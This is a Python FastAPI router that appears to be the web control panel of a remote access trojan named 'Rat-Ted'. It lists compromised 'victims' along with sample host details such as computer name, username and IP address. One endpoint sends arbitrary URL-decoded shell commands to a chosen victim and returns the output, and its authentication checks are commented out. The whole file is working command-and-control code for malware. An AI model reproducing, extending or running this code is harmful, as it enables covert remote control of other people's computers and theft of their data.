from fastapi import Depends, APIRouter
from auth.dependencies import *
from models.user import User
from host.server import RAT_SERVER
import urllib.parse

app = APIRouter()

# current_user: User = Depends(get_current_active_user)


@app.get("/clients")
async def read_users_me():
    # if current_user:
    # Current display of clients:

    # [{'System': ' Windows-10-10.0.23555-SP0 Core', 'Version': ' 10.0.23555', 'Architecture': " ('64bit', 'WindowsPE')", 'Name of Computer': ' Lukas', 'Processor': ' AMD64 Family 25 Model 33 Stepping 2, AuthenticAMD', 'Python': ' 3.10.9', 'User': ' lukma', 'IPv4': ' 192.168.87.22', 'IPv6': ' 192.168.87.22', 'Uptime': ' 8', 'Privileges': ' 0', 'Bit': ' AMD64', 'Rat-Ted-Version': ' 1.0.0'}]

    prettyClients = []
    print(RAT_SERVER.instance.victims)
    for client in RAT_SERVER.instance.victims:
        prettyClients.append(
            {"name": client["Name of Computer"], "ip": client["IPv4"], "status": "Online", "uuid": client["ID"]})

    return {"clients": prettyClients}


@app.post("/clients/{client_ip}/command")
async def execute_command(client_ip: str, command: str):
    # if current_user:

    # The command should be in a URL encoded format

    # Example: http://http://127.0.0.1:8001/api/v1/clients/127.0.0.1/command?command=ls%20-la
    # Decode the command
    command = urllib.parse.unquote(command)

    print(f"[*] Sending command {command} to {client_ip}")
    for client in RAT_SERVER.instance.clients:
        if client_ip == client[1][0]:
            RAT_SERVER.instance.execute(command, client[0])
            output = RAT_SERVER.instance.receive_output(client[0])

            # Make a time limit for the output
            # If the output is not received in 5 seconds, return an error

            if output is None:
                return {"output": "Error: Output not received"}
            return {"output": output}
    return {"output": "Error: Client not found"}
